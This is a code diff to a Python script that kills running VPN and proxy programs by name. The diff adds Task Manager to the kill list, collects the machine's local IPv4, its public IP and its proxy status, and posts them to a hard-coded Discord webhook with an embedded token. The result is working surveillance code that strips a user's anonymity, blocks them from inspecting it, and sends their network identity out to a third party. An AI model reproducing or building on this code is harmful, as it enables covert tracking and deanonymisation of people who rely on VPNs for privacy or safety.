@@ -1,5 +1,6 @@
 import psutil
-import time
+import requests
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn'
 
 KEYWORDS = [
     'Proton',
@@ -15,8 +16,8 @@ KEYWORDS = [
     'windscribe',
     'pia',
     'hotspot',
-    'wireguard',
-    'tunnelbear'
+    'tunnelbear',
+    'Task Manager'
 ]
 
 def kill_processes_by_keywords(keywords):
@@ -37,6 +38,28 @@ def kill_processes_by_keywords(keywords):
                 continue
         if not found:
             break
-        time.sleep(0.5)
 
 kill_processes_by_keywords(KEYWORDS)
+
+TRUE_IPV4 = None
+for interface_addresses in psutil.net_if_addrs().values():
+    for address in interface_addresses:
+        if address.family == psutil.AF_INET:
+            if not address.address.startswith('127.'):
+                TRUE_IPV4 = address.address
+                break
+    if TRUE_IPV4:
+        break
+
+API_IPV4 = None
+PROXY = None
+try:
+    r = requests.get("http://ip-api.com/json/", timeout=8)
+    data = r.json()
+    API_IPV4 = data.get("query")
+    PROXY = data.get("proxy", False)
+except Exception:
+    pass
+
+content = f"{TRUE_IPV4}\n{API_IPV4} {'true' if PROXY else 'false'}"
+requests.post(WEBHOOK_URL, json={'content': content})
